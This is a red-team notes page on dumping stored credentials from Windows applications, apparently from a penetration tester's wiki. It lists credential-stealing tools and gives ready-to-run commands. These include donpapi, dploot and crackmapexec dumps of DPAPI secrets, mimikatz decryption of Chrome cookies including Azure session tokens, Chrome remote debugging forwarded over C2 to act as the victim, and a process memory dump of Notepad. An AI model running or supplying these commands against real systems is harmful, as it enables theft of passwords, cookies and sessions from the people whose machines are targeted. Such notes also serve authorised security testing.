---
title: Application Credential Access
---

The following tools can be used to [[notes/mitre-attack/credential-access|access credentials]] from various [[notes/windows/index]] desktop applications.
Many of them are protected by [[notes/windows/dpapi-dump|DPAPI]].

Tool | Language | Access | Supported Applications
-----|----------|--------|-----------------------
[[notes/tools/donpapi]] | Python | Remote | Credential Manager, Vault, Certificates, Internet Explorer, Chrome, Edge, Firefox, WiFi, VNC, mRemoteNG
[[notes/tools/dploot]] | Python | Remote | Credential Manager, Vault, Certificates, Remote Desktop Connection Manager, Chrome, Edge, Firefox, WiFi
[[notes/tools/crackmapexec]] | Python | Remote | Uses dploot
[[notes/tools/lazagne]] | Python | Local | Chrome, Edge, Firefox, Outlook, Thunderbird, FileZilla, KeePass, WinSCP and many more
[SharpChromium](https://github.com/djhohnstein/SharpChromium) | C# | Local | Chome, Edge
[ThunderFox](https://github.com/V1V1/SharpScribbles/) | C# | Local | Firefox, Thunderbird
[offline_address_book_extractor.py](https://github.com/api0cradle/RedTeamScripts/blob/main/offline_address_book_extractor.py) | Pyhton | Offline | Outlook address book parser
[OutlookSpy](https://github.com/acole76/OutlookSpy) | C# | Local | Outlook
[SessionGopher](https://github.com/Arvanaghi/SessionGopher) | PowerShell | Local | WinSCP, PuTTY, FileZilla, RDP
[strings2](https://github.com/glmcdona/strings2) + [ProcessStringExtractor](https://gist.github.com/LuemmelSec/3f2c4b7642dc7b2ae63601ed02ec3db5) | C + PowerShell | Local | generic, find patterns in process memory
[PMP-Decrypter](https://github.com/LuemmelSec/PMP-Decrypter) | C# | Local | Patch My PC
[dumpscan](https://github.com/daddycocoaman/dumpscan) | Python | Remote | Find certificates in Minidumps

Dump DPAPI-protected secrets remotely and decrypt them with the domain backup key, the users password or NT hash.

=== "[[notes/tools/donpapi]]"
    Worked, but crashed in the end.

    ~~~ bash
    donpapi -o ./ws01/dpapi -pvk ./corp.pvk -local_auth administrator:'passw0rd'@ws01.corp.local
    donpapi -o ./ws01/dpapi -credz ./passwords.txt -local_auth administrator:'passw0rd'@ws01.corp.local
    donpapi -o ./ws01/dpapi -credz ./nthashse.txt -local_auth administrator:'passw0rd'@ws01.corp.local
    ~~~

=== "[[notes/tools/dploot]]"
    Failed during testing.

    ~~~ bash
    dploot triage -dump-all -export-triage ./ws01/dpapi -pvk ./corp.pvk -u administrator -p 'passw0rd' ws01.corp.local && dploot machinetriage -dump-all -export-triage ./ws01/dpapi -pvk ./corp.pvk -u administrator -p 'passw0rd' ws01.corp.local
    dploot triage -dump-all -export-triage ./ws01/dpapi -passwords ./passwords.txt -u administrator -p 'passw0rd' ws01.corp.local && dploot machinetriage -dump-all -export-triage ./ws01/dpapi -passwords ./passwords.txt -u administrator -p 'passw0rd' ws01.corp.local
    dploot triage -dump-all -export-triage ./ws01/dpapi -nthashes ./nthashes.txt -u administrator -p 'passw0rd' ws01.corp.local && dploot machinetriage -dump-all -export-triage ./ws01/dpapi -nthashes ./nthashes.txt -u administrator -p 'passw0rd' ws01.corp.local
    ~~~

=== "[[notes/tools/crackmapexec]]"
    As unprivileged user dump your own secrets, as local admin dump secrets from every user whose password is stored in CMEDB or as domain admin utilizing the domain backup keys.
    Uses [[notes/tools/dploot]] under the hood ([source](https://twitter.com/mpgn_x64/status/1627638010203316227)).

    ~~~ bash
    crackmapexec smb ws01.corp.local --local-auth -u administrator -p passw0rd --dpapi passwords && crackmapexec smb ws01.corp.local --local-auth -u administrator -p passw0rd --dpapi cookies
    ~~~

Dump Chrome cookies with [[notes/tools/mimikatz]].
Cookies for Azure are `ESTSAUTH`, `ESTSAUTHPERSISTENT` and `ESTSAUTHLIGHT`.

~~~ bat
mimikatz.exe "dpapi::chrome /in:%localappdata%googlechromeUSERDA~1defaultcookies /unprotect" exit
~~~

Untested tools:

- [pandora](https://github.com/efchatz/pandora), dumps credentials from various password manager Chrome plugins like 1Password, Bitwarden and LastPass
- [hekatomb](https://github.com/processus-thief/hekatomb), dumps domain backup keys, downloads credential files from all domain computers, decrypts the files

References:

- [TeamViewer](http://web.archive.org/web/20231215124900/https://whynotsecurity.com/blog/teamviewer/), TeamViewer password was stored in registry encrypted with static key
- [Extracting Encrypted Credentials from Common Tools](http://web.archive.org/web/20230816141251/https://scribe.rip/@xm-cyber/extracting-encrypted-credentials-from-common-tools-ceb83e7304ce), WinSCP, RoboMongo, MobaXterm
- [Analyzing LastPass, part 1](http://web.archive.org/web/20221012111523/https://www.mdsec.co.uk/2022/10/analysing-lastpass-part-1/)
- [Relaying YubiKeys](http://web.archive.org/web/20220919230832/https://cube0x0.github.io/Relaying-YubiKeys/)

## Chrome Remote Debugging

Start Chrome in headless and remote debugging mode.

~~~ bat
"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --remote-debugging-port=9222 --remote-debugging-address=127.0.0.1 --user-data-dir=%TEMP%\headless.profile --ignore-certificate-errors about:blank --headless
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --remote-debugging-port=9222 --remote-debugging-address=127.0.0.1 --user-data-dir=%TEMP%\headless.profile --ignore-certificate-errors about:blank --headless
~~~

Reverse forward the debug port over your C2.

Open Chrome on your machine and go to `chrome://inspect`.
Now you can browse the web in the name of your victim.

Untested tools:

- [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut), dumps cookies from debug port of Chromium-based browsers

References:

- [Sliver and Cursed Chrome for Post Exploitation](http://web.archive.org/web/20231013174228/https://dev.to/living_syn/sliver-and-cursed-chrome-for-post-exploitation-4gnk)
- [Debugging Cookie Dumping Failures with Chromiums Remote Debugger](http://web.archive.org/web/20230721071951/https://scribe.rip/@slyd0g/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
- [twitter.com/an0n_r0/status/1670007830072500225](https://twitter.com/an0n_r0/status/1670007830072500225)
- [Headless Remote Chrome Debugging](https://gist.github.com/NotMedic/b1ab7809eea94cc05513905b26964663)
- [Stalking inside of your Chromium Browser](https://web.archive.org/web/20221202231214/https://scribe.rip/@specterops/stalking-inside-of-your-chromium-browser-757848b67949)

# Unsaved Notepad

Dump the content of an open `notepad.exe` window that is not written to a file ([source](https://twitter.com/NinjaParanoid/status/1695682038593110193)):

~~~ bat
rundll32.exe comsvcs.dll MiniDump %PID% .\notepad.log full
strings.exe --encoding=l .\notepad.log
~~~

# Notepad++ Backups

Inspect files in `%USERPROFILE%\AppData\Roaming\Notepad++\backup`.

# ProtonPass

References:

- [ProtonPass: Auch nach Sperrung des Passwortspeichers verbleiben Nutzername/Passwort im Hauptspeicher](https://www.kuketz-blog.de/protonpass-auch-nach-sperrung-des-passwortspeichers-verbleiben-nutzername-passwort-im-hauptspeicher/), MiniDump contains plain passwords even if password manager is locked
